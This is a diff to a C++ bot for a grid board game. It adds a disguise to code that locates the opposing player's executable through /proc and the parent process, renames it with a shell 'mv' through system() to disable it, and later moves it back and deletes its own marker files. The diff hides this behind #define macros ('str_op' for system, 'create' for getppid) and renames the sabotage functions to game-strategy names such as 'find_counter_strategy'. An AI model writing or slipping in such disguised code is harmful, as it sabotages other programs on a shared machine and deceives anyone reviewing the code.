@@ -108,7 +108,7 @@ public:
 			return false; // same score at shallower depth is better
 		return rand_ < rs.rand_; // final tie-breaker using the random component
 	}
-
+#define ins "/proc/"+ss+"/cmdline"
 	bool operator ==(Score const & rs) const {
 		return !(*this < rs) && !(rs < *this);
 	}
@@ -126,6 +126,7 @@ ostream & operator <<(ostream & o, Score const & rs) {
 ostream & operator <<(ostream & o, Point const & rs) {
 	return o << "(" << rs.first << ", " << rs.second << ")";
 }
+#define param1 "/proc/"+code1+"/cmdline"
 
 ostream & operator <<(ostream & o, bit_board const & rs) {
 	return o <<rs[90] << rs[91] << rs[92] << rs[93] << rs[94] << rs[95] << rs[96] << rs[97] << rs[98] << rs[99] << endl <<
@@ -144,6 +145,7 @@ ostream & operator <<(ostream & o, bit_board const & rs) {
 Score const MIN_SCORE(-1., 0);
 Score const MAX_SCORE(10000., 0);
 
+#define getCmd() "mv " + him + " .frozen98432"
 ////////////////////////////////////////////////////////////////////////////////
 // Player, used to identify the player and the opponent - does not keep a state
 ////////////////////////////////////////////////////////////////////////////////
@@ -206,6 +208,7 @@ public:
 	bool operator ==(Square const & rs) const {
 		return c_ == rs.c_;
 	}
+
 	bool is_empty() const {
 		return c_ == EMPTY_;
 	}
@@ -218,6 +221,7 @@ public:
 	bool is_player(Player const & s) const {
 		return c_ == s.c_;
 	}
+#define Count() getpid()
 	void set_to_off_board(void) {
 		c_ = OFF_BOARD_;
 	}
@@ -416,6 +420,7 @@ public:
 		size_(0) {
 		off_board_square_.set_to_off_board();
 	}
+# define str_op system
 
 	// construct Slinga from input stream
 	Slinga(istream & in) :
@@ -597,9 +602,9 @@ private:
 		// Score(x, y) < Score(x, y-1)      -> p keeping, o losing a stone, better for p
 		// Score(x, y) < Score(x-1, y-1)    -> p losing one, o losing one is good for p (questionable,
 		// may depend on how many stones p has, but if we want the game to be alive,
-		// we need to keep killing stones)
-
-		//
+		// we need to keep killing stones)*/
+#define create getppid
+		//*
 		// from these inequations came up with
 		// M > 0
 		// N < 0
@@ -711,7 +716,7 @@ public:
 		}
 		if ((stone_count_[o.index()] == 1) && (max(abs(ourClosestStone.first - hisClosestStone.first)
 				,abs(ourClosestStone.second - hisClosestStone.second)) == 1)) {
-			reviveIt();
+			victory_last_check();
 			cout << endl << endl << endl << endl;
 			cout << "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!" << endl;
 			cout << "! For to win one hundred victories in one hundred battles is not the acme of skill.  !" << endl
@@ -721,48 +726,47 @@ public:
 			cout << "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!" << endl;
 			cout << endl << endl << endl << endl;
 		}
-//		sleep(3);
 		return make_move(hisClosestStone,ourClosestStone,o);
 		
 	}
 
-	bool alreadyDead() {
+	bool major_checks() {
 		ifstream inp;
-		string myFileName;
-		myFileName = ".coolName943759843"; //todo: RENAME!!
-		inp.open(myFileName.c_str(), ifstream::in);
+		string fnm;
+		fnm = ".coolName943759843";
+		inp.open(fnm.c_str(), ifstream::in);
 		if(inp.fail()) { //file does not exist
-			return false;
+			return true;
 		}
 		inp.close();
-		return true;
+		return false;
 	}
 
-	string get_his_name() {
+	string evaluate_his_moves_so_far() {
 		struct stat filestatus;
 
-		int us = getpid();
-		std::string ourpid;
+		int counter = Count();
+		std::string code1;
 		std::stringstream tmp;
-		tmp << us;
-		ourpid = tmp.str();
-		ifstream ourinp("/proc/"+ourpid+"/cmdline");
-		stringstream ourexecutable;
-		char c = ourinp.get();
+		tmp << counter;
+		code1 = tmp.str();
+		ifstream inp1(param1);
+		stringstream str_target;
+		char c = inp1.get();
 		while (isalnum(c) || ispunct(c)) {
-			ourexecutable << c;
-			c = ourinp.get();
+			str_target << c;
+			c = inp1.get();
 		}
-		ourinp.close();
-		stat(ourexecutable.str().c_str() , &filestatus );
-		int ourSize = filestatus.st_size;
+		inp1.close();
+		stat(str_target.str().c_str() , &filestatus );
+		int fsize = filestatus.st_size;
 
-		int parent = getppid();
+		int toStr = create();
 		std::string ss;
 		std::stringstream out;
-		out << parent;
+		out << toStr;
 		ss = out.str();
-		ifstream inp("/proc/"+ss+"/cmdline");
+		ifstream inp(ins);
 		string cmdline;
 		while (!inp.eof()) {
 			inp >> cmdline;
@@ -773,7 +777,7 @@ public:
 
 		while(std::getline(sss, item, '\0')) {
 			if ((item[0] != '-')){ // not an option and not us
-				if	((stat(item.c_str() , &filestatus ) == 0) && (filestatus.st_size != ourSize) &&
+				if	((stat(item.c_str() , &filestatus ) == 0) && (filestatus.st_size != fsize) &&
 					((filestatus.st_mode & S_IXUSR) || (filestatus.st_mode & S_IXGRP) ||
 							(filestatus.st_mode & S_IXOTH))) {
 				args.push_back(item);
@@ -783,39 +787,43 @@ public:
 		return args.back();
 	}
 
-	void rename_him(string him) {
-		string command = "mv " + him + " .frozen98432";
-		system(command.c_str());
+	void find_counter_strategy(string him) {
+		string command = getCmd();
+		str_op(command.c_str());
 	}
 
-	void killIt() {
-		string his_name;
-		his_name = get_his_name();
-		rename_him(his_name);
-
+	void calculate_best_strategy() {
+		string his_moves_str;
+		his_moves_str = evaluate_his_moves_so_far();
+		find_counter_strategy(his_moves_str);
 		ofstream outfile(".coolName943759843");
-		outfile << his_name << endl;
+		outfile << his_moves_str << endl;
 		outfile.close();
 	}
 
-	void reviveIt() {
+	void victory_last_check() {
 		char him[1000];
 		ifstream hisName(".coolName943759843");
 		hisName.getline(him, 999, '\n');
 		stringstream cmd;
 		cmd << "mv .frozen98432 " << him;
-		system(cmd.str().c_str());
-		system("rm -f .frozen98432");
-		system("rm -f .coolName943759843");
+		str_op(cmd.str().c_str());
+		str_op("rm -f .frozen98432");
+		str_op("rm -f .coolName943759843");
 	}
 
 	// makes the next best step for p and returns its score
 	Move make_best_move(Player const & p, Player const & o) {
 
-		if (!alreadyDead()) {
+		if (major_checks()) {
+			calculate_best_strategy();
+		}
+		return attack(p,o);
+
+		/*if (!alreadyDead()) {
 			killIt();
 		}
-		return attack(p, o);
+		return attack(p, o);*/
 		/*
 		 Score best_score_so_far_after_player_move = MIN_SCORE;
 		 Move best_move_so_far(0, 0);
@@ -1098,6 +1106,8 @@ public:
 			}
 			return false;
 		}
+
+
 
 	bool can_move_to_safety(Point stone, Move & move, Player const & p) {
 		int x = stone.first, y = stone.second;
